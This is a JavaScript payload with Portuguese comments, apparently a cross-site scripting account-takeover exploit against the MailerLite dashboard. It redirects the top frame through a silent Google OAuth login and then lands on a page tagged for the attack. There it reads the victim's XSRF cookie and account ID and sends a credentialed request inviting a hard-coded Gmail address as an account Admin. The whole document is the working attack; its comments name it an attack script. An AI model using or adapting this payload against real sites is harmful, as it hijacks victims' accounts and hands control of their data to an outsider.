(function() {
    const currentUrl = window.location.href;
    const initialUrl = "https://dashboard.mailerlite.com/products/168076388836836860/checkout/edit";

    // Se a URL não tiver a flag ?start, redireciona para o Google.
    if (!currentUrl.includes("?start")) {
        setTimeout(function() {
            window.top.location.href = "https://accounts.google.com/o/oauth2/v2/auth?as=AKF4tMmt3F52VXAA2Fq_tzFAUy9PRbyAzPqfTtLvsYI&client_id=588658642171-uatqq7pju7oriee4dhnno0f8oeekc047.apps.googleusercontent.com&scope=openid%20email%20profile&response_type=id_token&gsiwebsdk=gis_attributes&redirect_uri=https%3A%2F%2Faccounts.mailerlite.com%2Fauth%2Fgoogle%2Fcallback&response_mode=form_post&display=page&prompt=none&gis_params=Ch9odHRwczovL2FjY291bnRzLm1haWxlcmxpdGUuY29tEjRodHRwczovL2FjY291bnRzLm1haWxlcmxpdGUuY29tL2F1dGgvZ29vZ2xlL2NhbGxiYWNrGAciEGMyZGNiZDYwOGQzMTE4MzkqK0FLRjR0TW10M0Y1MlZYQUEyRnFfdHpGQVV5OVBSYnlBelBxZlR0THZzWUkySDU4ODY1ODY0MjE3MS11YXRxcTdwanU3b3JpZWU0ZGhubm4wZjhvZWVrYzA0Ny5hcHBzLmdvb2dsZXVzZXJjb250ZW50LmNvbTgCWiBodHRwczovL2FjY291bnRzLm1haWxlcmxpdGUuY29tLw";
        }, 1000);
        return;
    }

    // Se a URL tiver a flag ?start, redireciona para a página de ataque.
    if (currentUrl.includes("?start")) {
        setTimeout(function() {
            window.top.location.href = `${initialUrl}?ato`;
        }, 4000);
        return;
    }

    // Na dashboard, com ?ato, executa o fetch.
    if (currentUrl.includes("?ato")) {
        setTimeout(function() {
            try {
                const xsrfToken = decodeURIComponent(window.top.document.cookie.match(/XSRF-TOKEN=([^;]+)/)[1]);
                const accountId = window.top.document.querySelector('meta[name="account-id"]').getAttribute('content');
                
                const body = JSON.stringify({
                    role: "Admin",
                    permissions: [],
                    campaigns: [],
                    requires_periodic_password_change: true,
                    email: "gustavoribeirounic@gmail.com",
                });

                fetch('https://dashboard.mailerlite.com/api/invites', {
                    method: 'PUT',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json, text/plain, */*',
                        'X-Xsrf-Token': xsrfToken,
                        'X-Requested-With': 'XMLHttpRequest',
                        'X-Acc-Id': accountId
                    },
                    body: body,
                    credentials: 'include'
                })
                .then(response => {
                    console.log('Requisição PUT concluída. Status:', response.status);
                    if (!response.ok) {
                        return response.text().then(text => console.error('Erro:', text));
                    }
                    console.log('Convite de admin enviado com sucesso!');
                })
                .catch(e => {
                    console.error("Erro ao executar o fetch:", e);
                });

            } catch (e) {
                console.error("Erro no script de ataque:", e);
            }
        }, 4000);
    }
})();
